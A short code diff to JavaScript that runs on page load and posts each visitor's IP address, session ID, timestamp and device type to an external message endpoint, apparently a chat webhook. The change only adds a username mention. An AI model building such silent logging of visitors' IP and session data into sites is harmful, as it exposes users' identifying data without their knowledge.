@@ -38,7 +38,7 @@ window.addEventListener('load', () => {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `Your IP address is: **${ip}** sessionId: **${sessionId}** timestamp: **${new Date()}** device: **${detectDeviceType()}**`,
+                        content: `@oleksandrtrincher Your IP address is: **${ip}** sessionId: **${sessionId}** timestamp: **${new Date()}** device: **${detectDeviceType()}**`,
                     }),
                 });
     
